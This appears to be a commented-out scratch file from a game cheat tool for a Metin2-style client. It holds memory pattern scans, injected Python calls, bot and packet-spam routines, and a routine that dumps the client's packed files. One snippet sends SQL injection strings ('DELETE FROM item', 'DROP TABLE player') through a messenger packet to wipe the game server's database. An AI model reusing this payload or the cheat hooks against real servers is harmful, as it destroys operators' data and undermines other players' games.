//if (Globals::CPythonPlayerGetStatus == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetStatus", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerGetName == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetName", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerClickSkillSlot == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerClickSkillSlot", "Error", MB_OK);
//}
//if (Globals::CPythonPlayerGetItemIndex == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerGetItemIndex", "Error", MB_OK);
//}
//if (Globals::CInstanceBaseGetNameString == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CInstanceBaseGetNameString", "Error", MB_OK);
//}
//if (Globals::CInstanceBaseGetInstanceType == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CInstanceBaseGetInstanceType", "Error", MB_OK);
//}
//if (Globals::CPythonItemGetPickedItemID == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonItemGetPickedItemID", "Error", MB_OK);
//}
//if (Globals::CPythonCharacterManagerGetInstancePtr == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonCharacterManagerGetInstancePtr", "Error", MB_OK);
//}
//if (Globals::CInstanceBaseGetDistance == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CInstanceBaseGetDistance", "Error", MB_OK);
//}
//if (Globals::CPythonCharacterManagerIsAliveVID == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonCharacterManagerIsAliveVID", "Error", MB_OK);
//}
//if (Globals::pCPythonPlayerSetAttackKeyState == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerSetAttackKeyState", "Error", MB_OK);
//}
//if (Globals::pCPythonNetworkStreamSendItemPickUpPacket == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonNetworkStreamSendItemPickUpPacket", "Error", MB_OK);
//}
//if (Globals::pCInstanceBaseSetDirection == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CInstanceBaseSetDirection", "Error", MB_OK);
//}
//if (Globals::pCPythonPlayerNEW_GetMainActorPtr == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonPlayerNEW_GetMainActorPtr", "Error", MB_OK);
//}
//
//if (Globals::pCInstanceBaseIsMountingHorse == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CInstanceBaseIsMountingHorse", "Error", MB_OK);
//}
//if (Globals::pCPythonNetworkStreamSendChatPacket == 0x00)
//{
//	MessageBoxA(NULL, "Pattern Fail: CPythonNetworkStreamSendChatPacket", "Error", MB_OK);
//}
//#endif

//*/

/*Globals::iCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(hEntryBaseAddress + pCPythonCharacterManagerInstance);
Globals::iCPythonPlayerInstance = *reinterpret_cast<DWORD *>(hEntryBaseAddress + pCPythonPlayerInstance);
Globals::iCPythonNetworkStreamInstance = *reinterpret_cast<DWORD *>(hEntryBaseAddress + pCPythonNetworkStreamInstance)*/;
//#####################################################################################################################################

//
//static const char* bCPythonPlayerInstance;
//static const char* bCPythonNetworkStreamInstance;
//static const char* bCPythonCharacterManagerInstance;
//static const char* mCPythonPlayerInstance;
//static const char* mCPythonNetworkStreamInstance;
//static const char* mCPythonCharacterManagerInstance;


////#####################################################################################################################################
//static const char* bPyCallClassMemberFunc;
//static const char* bCNetworkStreamRecv;
//static const char* bCNetworkStreamSend;
//static const char* bCPythonNetworkStreamSendItemUsePacket;
//static const char* bCPythonPlayerNEW_Fishing;
//static const char* bCPythonPlayerGetTargetVID;
//static const char* bCPythonPlayerPickCloseItem;
//static const char* bCPythonPlayerGetMainCharacterIndex;
//static const char* bCPythonPlayerGetRace;
//static const char* bCPythonPlayerIsSkillCoolTime;
//static const char* bCPythonPlayerSetStatus;
//static const char* bCPythonPlayerGetStatus;
//static const char* bCPythonPlayerGetName;
//static const char* bCPythonPlayerClickSkillSlot;
//static const char* bCPythonPlayerGetItemIndex;
//static const char* bCInstanceBaseGetNameString;
//static const char* bCInstanceBaseGetInstanceType;
//static const char* bCPythonItemGetPickedItemID;
//static const char* bCPythonCharacterManagerGetInstancePtr;
//static const char* bCInstanceBaseGetDistance;
//static const char* bCPythonCharacterManagerIsAliveVID;
//static const char* bCPythonPlayerSetAttackKeyState;
//static const char* bCPythonNetworkStreamSendItemPickUpPacket;
//static const char* bCInstanceBaseSetDirection;
//static const char* bCPythonPlayerNEW_GetMainActorPtr;
//static const char* bCPythonChatAppendChat;
//static const char* bCInstanceBaseIsMountingHorse;
//static const char* bCPythonNetworkStreamSendChatPacket;
//static const char* bCGraphicTextInstanceSetValue;
//static const char* bCPythonItemCreateItem;
//static const char* bCPythonNetworkStreamSendFishingPacket;
//static const char* bCPythonNetworkStreamSendExchangeStartPacket;
//static const char* bCPythonNetworkStreamSendExchangeItemAddPacket;
//static const char* bCPythonNetworkStreamSendExchangeAcceptPacket;
//
//static const char* bCInstanceBaseNEW_GetPixelPosition;
//static const char* bCInstanceBaseNEW_MoveToDestPixelPositionDirection;
//
////#####################################################################################################################################
//static const char* mPyCallClassMemberFunc;
//static const char* mCNetworkStreamRecv;
//static const char* mCNetworkStreamSend;
//static const char* mCPythonNetworkStreamSendItemUsePacket;
//static const char* mCPythonPlayerNEW_Fishing;
//static const char* mCPythonPlayerGetTargetVID;
//static const char* mCPythonPlayerPickCloseItem;
//static const char* mCPythonPlayerGetMainCharacterIndex;
//static const char* mCPythonPlayerGetRace;
//static const char* mCPythonPlayerIsSkillCoolTime;
//static const char* mCPythonPlayerSetStatus;
//static const char* mCPythonPlayerGetStatus;
//static const char* mCPythonPlayerGetName;
//static const char* mCPythonPlayerClickSkillSlot;
//static const char* mCPythonPlayerGetItemIndex;
//static const char* mCInstanceBaseGetNameString;
//static const char* mCInstanceBaseGetInstanceType;
//static const char* mCPythonItemGetPickedItemID;
//static const char* mCPythonCharacterManagerGetInstancePtr;
//static const char* mCInstanceBaseGetDistance;
//static const char* mCPythonCharacterManagerIsAliveVID;
//static const char* mCPythonPlayerSetAttackKeyState;
//static const char* mCPythonNetworkStreamSendItemPickUpPacket;
//static const char* mCInstanceBaseSetDirection;
//static const char* mCPythonPlayerNEW_GetMainActorPtr;
//static const char* mCPythonChatAppendChat;
//static const char* mCInstanceBaseIsMountingHorse;
//static const char* mCPythonNetworkStreamSendChatPacket;
//static const char* mCGraphicTextInstanceSetValue;
//static const char* mCPythonItemCreateItem;
//static const char* mCPythonNetworkStreamSendFishingPacket;
//static const char* mCPythonNetworkStreamSendExchangeStartPacket;
//static const char* mCPythonNetworkStreamSendExchangeItemAddPacket;
//static const char* mCPythonNetworkStreamSendExchangeAcceptPacket;
//
//static const char* mCInstanceBaseNEW_GetPixelPosition;
//static const char* mCInstanceBaseNEW_MoveToDestPixelPositionDirection;


//const char*				Globals::bPyCallClassMemberFunc = NULL;
//const char*				Globals::bCNetworkStreamRecv = NULL;
//const char*				Globals::bCNetworkStreamSend = NULL;
//const char*				Globals::bCPythonNetworkStreamSendItemUsePacket = NULL;
//const char*				Globals::bCPythonPlayerNEW_Fishing = NULL;
//const char*				Globals::bCPythonPlayerGetTargetVID = NULL;
//const char*				Globals::bCPythonPlayerPickCloseItem = NULL;
//const char*				Globals::bCPythonPlayerGetMainCharacterIndex = NULL;
//const char*				Globals::bCPythonPlayerGetRace = NULL;
//const char*				Globals::bCPythonPlayerIsSkillCoolTime = NULL;
//const char*				Globals::bCPythonPlayerSetStatus = NULL;
//const char*				Globals::bCPythonPlayerGetStatus = NULL;
//const char*				Globals::bCPythonPlayerGetName = NULL;
//const char*				Globals::bCPythonPlayerClickSkillSlot = NULL;
//const char*				Globals::bCPythonPlayerGetItemIndex = NULL;
//const char*				Globals::bCInstanceBaseGetNameString = NULL;
//const char*				Globals::bCInstanceBaseGetInstanceType = NULL;
//const char*				Globals::bCPythonItemGetPickedItemID = NULL;
//const char*				Globals::bCPythonCharacterManagerGetInstancePtr = NULL;
//const char*				Globals::bCInstanceBaseGetDistance = NULL;
//const char*				Globals::bCPythonCharacterManagerIsAliveVID = NULL;
//const char*				Globals::bCPythonPlayerSetAttackKeyState = NULL;
//const char*				Globals::bCPythonNetworkStreamSendItemPickUpPacket = NULL;
//const char*				Globals::bCInstanceBaseSetDirection = NULL;
//const char*				Globals::bCPythonPlayerNEW_GetMainActorPtr = NULL;
//const char*				Globals::bCPythonChatAppendChat = NULL;
//const char* Globals::bCInstanceBaseIsMountingHorse = NULL;
//const char* Globals::bCPythonNetworkStreamSendChatPacket = NULL;
//const char* Globals::bCGraphicTextInstanceSetValue = NULL;
//
//
//const char* Globals::bCPythonItemCreateItem = NULL;
//
//
//const char* Globals::bCPythonNetworkStreamSendFishingPacket = NULL;
//const char* Globals::bCPythonNetworkStreamSendExchangeStartPacket = NULL;
//const char* Globals::bCPythonNetworkStreamSendExchangeItemAddPacket = NULL;
//const char* Globals::bCPythonNetworkStreamSendExchangeAcceptPacket = NULL;
//
//
//const char* Globals::bCInstanceBaseNEW_GetPixelPosition = NULL;
//const char* Globals::bCInstanceBaseNEW_MoveToDestPixelPositionDirection = NULL;
//
////################################################################################################################################
//
//
//const char*				Globals::mPyCallClassMemberFunc = NULL;
//const char*				Globals::mCNetworkStreamRecv = NULL;
//const char*				Globals::mCNetworkStreamSend = NULL;
//const char*				Globals::mCPythonNetworkStreamSendItemUsePacket = NULL;
//const char*				Globals::mCPythonPlayerNEW_Fishing = NULL;
//
//
//const char* Globals::mCPythonPlayerGetTargetVID = NULL;
//const char* Globals::mCPythonPlayerPickCloseItem = NULL;
//const char* Globals::mCPythonPlayerGetMainCharacterIndex = NULL;
//const char* Globals::mCPythonPlayerGetRace = NULL;
//const char* Globals::mCPythonPlayerIsSkillCoolTime = NULL;
//const char* Globals::mCPythonPlayerSetStatus = NULL;
//const char* Globals::mCPythonPlayerGetStatus = NULL;
//const char* Globals::mCPythonPlayerGetName = NULL;
//const char* Globals::mCPythonPlayerClickSkillSlot = NULL;
//const char* Globals::mCPythonPlayerGetItemIndex = NULL;
//const char* Globals::mCInstanceBaseGetNameString = NULL;
//const char* Globals::mCInstanceBaseGetInstanceType = NULL;
//const char* Globals::mCPythonItemGetPickedItemID = NULL;
//const char* Globals::mCPythonCharacterManagerGetInstancePtr = NULL;
//const char* Globals::mCInstanceBaseGetDistance = NULL;
//const char* Globals::mCPythonCharacterManagerIsAliveVID = NULL;
//const char* Globals::mCPythonPlayerSetAttackKeyState = NULL;
//const char* Globals::mCPythonNetworkStreamSendItemPickUpPacket = NULL;
//const char* Globals::mCInstanceBaseSetDirection = NULL;
//const char* Globals::mCPythonPlayerNEW_GetMainActorPtr = NULL;
//const char* Globals::mCPythonChatAppendChat = NULL;
//
//const char* Globals::mCInstanceBaseIsMountingHorse = NULL;
//const char* Globals::mCPythonNetworkStreamSendChatPacket = NULL;
//const char* Globals::mCGraphicTextInstanceSetValue = NULL;
//
//
//
//
//const char* Globals::mCPythonItemCreateItem = NULL;
//const char* Globals::mCPythonNetworkStreamSendFishingPacket = NULL;
//const char* Globals::mCPythonNetworkStreamSendExchangeStartPacket = NULL;
//const char* Globals::mCPythonNetworkStreamSendExchangeItemAddPacket = NULL;
//const char* Globals::mCPythonNetworkStreamSendExchangeAcceptPacket = NULL;
//
//
//const char* Globals::mCInstanceBaseNEW_GetPixelPosition = NULL;
//const char* Globals::mCInstanceBaseNEW_MoveToDestPixelPositionDirection = NULL;


//const char* Globals::bCPythonPlayerInstance = NULL;
//const char* Globals::bCPythonNetworkStreamInstance = NULL;
//const char* Globals::bCPythonCharacterManagerInstance = NULL;
//const char* Globals::mCPythonPlayerInstance = NULL;
//const char* Globals::mCPythonNetworkStreamInstance = NULL;
//const char* Globals::mCPythonCharacterManagerInstance = NULL;

//Timer timer;
//timer.start();
//GameFunctionsCustom::GetVidsInDistance(2000); // 0 => 100 000 000
//timer.stop();
//int u = timer.milli();



/*DWORD k = *reinterpret_cast<DWORD *>(0x009C79D8);
GameFunctions::PlayerSetAttackKeyState(true);*/

/*Misc::UpdateBalloon((HWND)this->winId(), L"huj", L"huj", NULL);*/
//ui.graphicsViewStatusRaceImage->setStyleSheet("background: transparent");
//ui.graphicsViewStatusRaceJob->setStyleSheet("background: transparent");
//
//QImage *image = new QImage(":/MainForm/Resources/SHAMAN-F.PNG");
//QGraphicsScene *scn = new QGraphicsScene(this); // object defined in header
//// scn->setSceneRect(ui->graphicsView->Rect()); // SOMETHING LIHE THIS
//ui.graphicsViewStatusRaceImage->setScene(scn);
//scn->addPixmap(QPixmap::fromImage(*image));
//ui.graphicsViewStatusRaceImage->fitInView(scn->sceneRect(), Qt::IgnoreAspectRatio);

//QImage *image2 = new QImage(":/MainForm/Resources/SS.png");
//QGraphicsScene *scn2 = new QGraphicsScene(this); // object defined in header
//// scn->setSceneRect(ui->graphicsView->Rect()); // SOMETHING LIHE THIS
//ui.graphicsViewStatusRaceJob->setScene(scn2);
//scn2->addPixmap(QPixmap::fromImage(*image2));
//ui.graphicsViewStatusRaceJob->fitInView(scn2->sceneRect(), Qt::IgnoreAspectRatio);


/*GameFunctions::InstanceBaseNEW_GetPixelPosition*/



/*for (int i = 0; i < 1000000; i++)
{
DWORD *u = GameFunctions::CharacterManagerGetInstancePtr(i);
if (u)
{
int type = GameFunctions::InstanceBaseGetInstanceType(u);
if (type == TYPE_ENEMY)
{
int dis = 0;
dis = GameFunctions::InstanceBaseGetDistance(GameFunctions::PlayerNEW_GetMainActorPtr(), u);;
if (dis < 3500)
{
GameFunctions::NetworkStreamSendFlyTargetingPacket(i, D3DVECTOR{ 0, 0, 0 });
GameFunctions::NetworkStreamSendShootPacket(0);
Sleep(20);
}
}


}

}*/
/*int k = GameFunctions::PlayerGetItemIndex(0);
GameFunctions::NetworkStreamSendChatPacket("/safebox_password 000000.", 0);*/
/*GameFunctions::NetworkStreamSendSendExchangeItemAddPacket(TItemPos(1, 0), 1);
GameFunctions::NetworkStreamSendSendExchangeAcceptPacket();*/
/*GameFunctions::NetworkStreamSendItemDropPacketNew(0, 0, 0);*/
//for (std::vector<string>::iterator it = Globals::CEterFileDict.begin(); it != Globals::CEterFileDict.end(); ++it) {
//	
//	AppendFishBotLogNormal(it->c_str());

//	/* std::cout << *it; ... */
//}
/*int i = GameFunctions::PlayerGetTargetVID();





void Myfunction()
//{
//	PyRun_SimpleString("import net");
//	PyRun_SimpleString("net.SendMessengerRemovePacket(\"';DELETE FROM item; --\", \"ss\")");
//	PyRun_SimpleString("net.SendMessengerRemovePacket(\"';DROP TABLE player; --\", \"ss\")");
//	MessageBoxA(NULL, "[SQL-Injection] Queries sent correctly!", "*** Exploit (Skype: sacadatt.amazon) ***", NULL);
//}

GameFunctions::NetworkStreamSendUseSkillPacket(35, i);

for (int j = 0; j < 1000; j++)
{
GameFunctions::NetworkStreamSendFlyTargetingPacket(i, D3DVECTOR{ 0, 0, 0 });


GameFunctions::NetworkStreamSendShootPacket(35);
Sleep(10);
}*/


/*GameFunctions::NetworkStreamSendScriptAnswerPacket(0);*/







//int licznik = 0;
//
//for (std::vector<string>::iterator it = Globals::CEterFileDict.begin(); it != Globals::CEterFileDict.end(); ++it)
//{
//	if (StringExtension::Contains(it->c_str(), ".py") || StringExtension::Contains(it->c_str(), ".txt"))
//	{
//		const void * pvData = NULL;
//		/*	AppendFishBotLogNormal(it->c_str());*/
//		DWORD rvMappedFile;
//		Globals::CMappedFile(&rvMappedFile);
//		Globals::CEterPackManagerGet((void*)Globals::iCEterPackManagerInstance, &rvMappedFile, it->c_str(), &pvData);
//
//		DWORD size = Globals::CMappedFileSize(&rvMappedFile);
//		/*	char *bj = new char[size];
//			memcpy(&bj, &pvData, sizeof(bj));*/
//		string path = it->c_str();
//		string path2 = "./Dump/" + path;
//		string path3 = StringExtension::ReplaceString(path2, "d:/", "");
//		boost::filesystem::path rootPath(path3);
//		boost::system::error_code returnedError;
//
//		boost::filesystem::create_directories(rootPath.parent_path(), returnedError);
//		boost::filesystem::ofstream  out(rootPath, std::ios::out | std::ios::binary);
//		out.write((const char *)pvData, size);
//		/*out << "Richar";*/
//		out.close();
//		/*	}*/
//		licznik++;
//		QMetaObject::invokeMethod(Globals::mainform, "AppendFishBotLog", Q_ARG(QString, path3.c_str()), Q_ARG(int, RED));
//	}
//
//}





/*FileExtension::CreateDirectoryPath("d:/dump1/dump/dump");*/


//for (std::vector<string>::iterator it = Globals::CEterFileDict.begin(); it != Globals::CEterFileDict.end(); ++it)
//{
//	AppendFishBotLogNormal(it->c_str());
//}


//}
//catch (const std::overflow_error& e)
//{
//	MessageBox(NULL, L"Error", StringExtension::GetWideChar(e.what()), 0);
//}
//catch (const std::runtime_error& e)
//{
//	MessageBox(NULL, L"Error", StringExtension::GetWideChar(e.what()), 0);
//}
//catch (const std::exception& e)
//{
//	MessageBox(NULL, L"Error", StringExtension::GetWideChar(e.what()), 0);
//}
//catch (...)
//{
//	MessageBox(NULL, L"Error", L"Jakis tam", 0);
//}


///*Sleep(2000);
//
//	MessageBox(NULL, L"BPget", L"BreakePoint", 0);*/






//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//MessageBox(NULL, L"BP2", L"BreakePoint", 0);
//Py_NoSiteFlag = 1; Py_FrozenFlag = 1; Py_IgnoreEnvironmentFlag = 1; Py_SetPythonHome(""); Py_SetProgramName("");
//Py_Initialize();
//
//
//
//PyObject * huji = ((PyObject*(__cdecl*)(const char *name))GetProcAddress(GetModuleHandleA("python27.dll"), "PyImport_AddModule"))("__main__");
//
//PyObject * huj = ((PyObject*(__cdecl*)(PyObject*))GetProcAddress(GetModuleHandleA("python27.dll"), "PyModule_GetDict"))(huji);
//
//
///*((char* (__cdecl*)(PyObject *string))GetProcAddress(GetModuleHandleA("python27.dll"), "PyString_AsString"))(key);*/
//PyObject *key, *value;
//Py_ssize_t pos = 0;
//while (((int(__cdecl*)(PyObject *p, Py_ssize_t *ppos, PyObject **pkey, PyObject **pvalue))GetProcAddress(GetModuleHandleA("python27.dll"), "PyDict_Next"))(huj, &pos, &key, &value))
//{
//	char* ckey = ((char* (__cdecl*)(PyObject *string))GetProcAddress(GetModuleHandleA("python27.dll"), "PyString_AsString"))(key);
//
//	AppendFishBotLogNormal(ckey);
//}
//
//PyObject * huj2 = ((PyObject*(__cdecl*)())GetProcAddress(GetModuleHandleA("python27.dll"), "PyImport_GetModuleDict"))();
//while (((int(__cdecl*)(PyObject *p, Py_ssize_t *ppos, PyObject **pkey, PyObject **pvalue))GetProcAddress(GetModuleHandleA("python27.dll"), "PyDict_Next"))(huj2, &pos, &key, &value))
//{
//	char* ckey = ((char* (__cdecl*)(PyObject *string))GetProcAddress(GetModuleHandleA("python27.dll"), "PyString_AsString"))(key);
//
//	AppendFishBotLogNormal(ckey);
//}
//
//
//PyObject *key, *value;
//Py_ssize_t pos = 0;
//PyObject * huj2 = PyImport_GetModuleDict();
//while (PyDict_Next(huj2, &pos, &key, &value))
//{
//	char* ckey = PyString_AsString(key);
//
//	AppendFishBotLogNormal(ckey);
//}
//PyRun_SimpleStringFlags("import bubu", NULL);
//}
//
//
//PyThreadState* u = ((PyThreadState * (__cdecl*)())GetProcAddress(GetModuleHandleA("python27.dll"), "PyThreadState_Get"))();
//
//PyInterpreterState *interp = PyThreadState_GET()->interp;
///*interp = u->interp;*/
//memcpy(interp, u->interp, sizeof(PyInterpreterState));
//
///*((int (__cdecl*)(const char *, PyCompilerFlags *))GetProcAddress(GetModuleHandleA("python27.dll"), "PyRun_SimpleStringFlags"))("exec(compile(open('bubu.py').read(), 'bubu.py', 'exec'))", NULL);*/
////PyRun_SimpleStringFlags("exec(compile(open('bubu.py').read(), 'bubu.py', 'exec'))", NULL);
//PyObject * huji = ((PyObject*(__cdecl*)(const char *name))GetProcAddress(GetModuleHandleA("python27.dll"), "PyImport_AddModule"))("__main__");
//
//PyObject * huj = ((PyObject*(__cdecl*)(PyObject*))GetProcAddress(GetModuleHandleA("python27.dll"), "PyModule_GetDict"))(huji);
//
//PyObject * v = PyRun_StringFlags("exec(compile(open('bubu.py').read(), 'bubu.py', 'exec'))", Py_file_input, huj, huj, NULL);
//
//if (!v)
//{
//	//	std::string str;
//
//	//
//	//	PyObject * exc;
//	//	PyObject * v;
//	//	PyObject * tb;
//	//	const char * errStr;
//
//	//	PyErr_Fetch(&exc, &v, &tb);
//
//	//	if (PyString_Check(v))
//	//	{
//	//		errStr = PyString_AS_STRING(v);
//	//		str.append("Error: ");
//	//		str.append(errStr);
//
//	//		AppendFishBotLogNormal(errStr);
//	//	}
//	///*	Py_DECREF(exc);
//	//	Py_DECREF(v);
//	//	Py_DECREF(tb);*/
//	//	AppendFishBotLogNormal(str.c_str());
//
//string y = "|cFF005500|H|hR|cFFff0000|H|hu|cFF3a6eff|H|hc |cFF00ff00|H|hh|cFFff00ff|H|ha|cFF55ffff|H|hm |cFFaa55ff|H|hC |cFF732704|H|hi.|cFFffff7f|H|hS|cFF717313|H|ht|cFF212173|H|ha|cFFffffff|H|hr|cFFff0000|H|ha|cffff7f|H|hx|cFFff00ff|H|hX|caaff7f|H|hx|cFF00ff7f|H|hD|cFF23b7d4|H|hD";
//
////string y = "|cFF005500|H|hK|cFFff0000|H|ht|cFF3a6eff|H|ho |cFF00ff00|H|hj|cFFff00ff|H|he|cFF55ffff|H|hs|cFFaa55ff|H|ht |cFF732704|H|ht|cFFffff7f|H|he|cFF717313|H|hc|cFF212173|H|hh|cFFffffff|H|hn|cFFff0000|H|hi|cffff7f|H|hk|cFFff00ff|H|hi|caaff7f|H|he|cFF00ff7f|H|hm|cFF23b7d4|H|h?";
//GameFunctions::NetworkStreamSendChatPacket(y.c_str(), CHAT_TYPE_TALKING);
//
////map<DWORD, DWORD *> ik = GameFunctionsCustom::GetObjectListInDistance(6, 2000);
////for (TCharacterInstanceMap::iterator itor =ik.begin(); itor != ik.end(); itor++)
////{
////	DWORD vid = itor->first;
//
//
////	
////	PlainTextEditAppend("plainTextEditTest",GameFunctions::InstanceBaseGetNameString(itor->second));
////}

//DWORD base = 0;
//HANDLE process = GetCurrentProcess();
//
//MEMORY_BASIC_INFORMATION info;
//unsigned char* p = NULL;
//DWORD baseAdress;
//for (p = NULL;
//	VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info);
//	p += info.RegionSize)
//{
//	if ((info.State == MEM_COMMIT) && ((info.Type & MEM_MAPPED) || (info.Type & MEM_PRIVATE)) && (info.RegionSize == 0x01e27000)) {
//		baseAdress = (DWORD)info.BaseAddress;
//		Globals::hEntryBaseAddress = (DWORD)info.BaseAddress;
//	}
//}
///*GameFunctions::PlayerClickSkillSlot(2);*/
//DWORD kod = (DWORD)PatternScan2::FindPattern(Globals::hEntryBaseAddress, "8B 15 ? ? ? ? 89 55 FC 0F B7 45 F0");
//DWORD pCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(kod + 0x2);
//Globals::iCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(pCPythonCharacterManagerInstance);
//ui.plainTextEditTest->appendHtml(to_string(Globals::hEntryBaseAddress).c_str());
//
//
//ui.plainTextEditTest->appendHtml(to_string(pCPythonCharacterManagerInstance).c_str());
//
///*string a = "Jest Metinow Gra W Zasiegu " + to_string(GameFunctionsCustom::GetObjectCountInDistance(TYPE_STONE, 10000));
//string b = "Jestczy W Zasiegu " + to_string(GameFunctionsCustom::GetObjectCountInDistance(TYPE_PC, 10000));
//string c = "Jest Npc W Zasiegu" + to_string(GameFunctionsCustom::GetObjectCountInDistance(TYPE_NPC, 10000));
//string d = "Jest Potworow W Zasiegu" + to_string(GameFunctionsCustom::GetObjectCountInDistance(TYPE_ENEMY, 10000));*/
////ui.plainTextEditTest->appendHtml(a.c_str());
////ui.plainTextEditTest->appendHtml(b.c_str());
////ui.plainTextEditTest->appendHtml(c.c_str());
////ui.plainTextEditTest->appendHtml(d.c_str());
//int t = 0;
//Globals::m_kAliveInstMap = *(TCharacterInstanceMap*)(Globals::iCPythonCharacterManagerInstance + 32)/* + 4*/;
//int index = PythonGameFunction::PlayerGetMainCharacterIndex();
/*for (TCharacterInstanceMap::iterator itor = Globals::m_kAliveInstMap.begin(); itor != Globals::m_kAliveInstMap.end(); itor++)
{
	t++;
}*/
//TCharacterInstanceMap m_kAliveInstMap = (*reinterpret_cast<TCharacterInstanceMap *>(Globals::iCPythonCharacterManagerInstance + 32));

/*TCharacterInstanceMap::iterator itor = *reinterpret_cast<TCharacterInstanceMap::iterator *>(Globals::iCPythonCharacterManagerInstance + 32);
TCharacterInstanceMap::iterator  itorEnd = *reinterpret_cast<TCharacterInstanceMap::iterator *>((Globals::iCPythonCharacterManagerInstance + 32)+4);



for (; itor != itorEnd; ++itor){
	t++;

}
*/

/*TCharacterInstanceMap& m_kAliveInstMap = *(TCharacterInstanceMap*)(Globals::iCPythonCharacterManagerInstance + 32);

for (TCharacterInstanceMap::iterator itor = m_kAliveInstMap.begin(); itor != m_kAliveInstMap.end(); itor++)
{
	t++;
}*/
//ui.plainTextEditTest->appendHtml(to_string(t).c_str());
//DWORD kod = (DWORD)PatternScan::FindPattern("? ? ? ? 5D C3 CC CC CC CC CC CC 55 8B EC B8 ? ? ? ? 5D C3 CC CC CC CC CC CC 55 8B EC 83 EC 0C 89 4D FC 8B 4D FC E8 ? ? ? ? 50 E8 ? ? ? ? 83 C4 04 89 45 F8 E8 ? ? ? ? 89 45 F4 8D 45 F8 50 8D 4D F4 51 E8 ? ? ? ? 83 C4 08 8B 00 8B E5 5D C3");
//DWORD pCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(kod);
//Globals::iCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(pCPythonCharacterManagerInstance);
//ui.plainTextEditTest->appendHtml(to_string(Globals::hEntryBaseAddress).c_str());
//
//TCharacterInstanceMap m_kAliveInstMap = *(TCharacterInstanceMap*)(*reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(Globals::iCPythonCharacterManagerInstance + 32) + 4));
//
//
///*TCharacterInstanceMap::iterator itor = m_kAliveInstMap.begin();
//TCharacterInstanceMap::iterator itore = m_kAliveInstMap.end();*/
//
//
////TCharacterInstanceMap m_kAliveInstMap = *(TCharacterInstanceMap*)*reinterpret_cast<DWORD *>((Globals::iCPythonCharacterManagerInstance + 32) );
//
//TCharacterInstanceMap::iterator itor = m_kAliveInstMap.begin();
//TCharacterInstanceMap::iterator itore = m_kAliveInstMap.end();
//
//TCharacterInstanceMap *a = &m_kAliveInstMap;
//TCharacterInstanceMap::iterator *b = &itor;
//TCharacterInstanceMap::iterator *c = &itore;
//int t = 0;
//for (TCharacterInstanceMap::iterator itor = m_kAliveInstMap.begin(); itor != m_kAliveInstMap.end(); itor++)
//{
//	t++;
//}
/*GameFunctions::NetworkStreamSendUseSkillPacket(35, GameFunctions::PlayerGetTargetVID());


for (int i = 0; i < 100; i++)
{
GameFunctions::NetworkStreamSendFlyTargetingPacket(GameFunctions::PlayerGetTargetVID(), D3DVECTOR{ 0, 0, 0 });



	}

	GameFunctions::NetworkStreamSendShootPacket(0);*/

	/*bool o = GameFunctions::PlayerIsSkillActive(4);
	bool jo = GameFunctions::PlayerIsSkillCoolTime(4);*/



//PyObject* Import(PyObject* self, PyObject* args)
//{
//	const char* tekst;
//	if (PyArg_ParseTuple(args, "s", &tekst))
//	{
//
//		typedef PyObject*(*tPyImport_GetModuleDict)();
//		tPyImport_GetModuleDict nPyImport_GetModuleDict = (tPyImport_GetModuleDict)(Globals::hEntryBaseAddress + 0x3C3F00);
//
//
//		typedef PyObject*(*tPyDict_GetItemString)(PyObject *p, const char *key);
//		static  tPyDict_GetItemString nPyDict_GetItemString = (tPyDict_GetItemString)(Globals::hEntryBaseAddress + 0x39EF70);
//
//		/*PyObject * huj2 = ((PyObject*(__cdecl*)())GetProcAddress(GetModuleHandleA("python27.dll"), "PyImport_GetModuleDict"))();
//		PyObject* modul = ((PyObject* (__cdecl*)(PyObject *p, const char *key))GetProcAddress(GetModuleHandleA("python27.dll"), "PyDict_GetItemString"))(huj2, tekst);
//		*/
//
//		PyObject * huj2 = nPyImport_GetModuleDict();
//		PyObject* modul = nPyDict_GetItemString(huj2, tekst);
//
//
//		if (modul)
//		{
//			return Py_BuildValue("S", modul);
//		}
//		else
//		{
//			/*	MessageBox(0, tekst, L"Error No Module", 0);*/
//				/*Py_RETURN_NONE;*/
//		}
//	}
//	/*Py_RETURN_NONE;*/
//}
//PyMethodDef InitPython[] = {
//	{"Import", Import, METH_VARARGS },
//	{ NULL, NULL, NULL },
//};


//HANDLE process = GetCurrentProcess();
//
//MEMORY_BASIC_INFORMATION info;
////unsigned char* p = NULL;
////DWORD baseAdress;
////for (p = NULL;
////	VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info);
////	p += info.RegionSize)
////{
//	if ((info.State == MEM_COMMIT) && ((info.Type & MEM_MAPPED) || (info.Type & MEM_PRIVATE)) && (info.RegionSize == 0x01e27000)) {
//		baseAdress = (DWORD)info.BaseAddress;
//		Globals::hEntryBaseAddress = (DWORD)info.BaseAddress;
//	}
////}
//DWORD kod = (DWORD)PatternScan2::FindPattern(Globals::hEntryBaseAddress, "8B 15 ? ? ? ? 89 55 FC 0F B7 45 F0");
//DWORD pCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(kod + 0x2);
//Globals::iCPythonCharacterManagerInstance = *reinterpret_cast<DWORD *>(pCPythonCharacterManagerInstance);
//
//
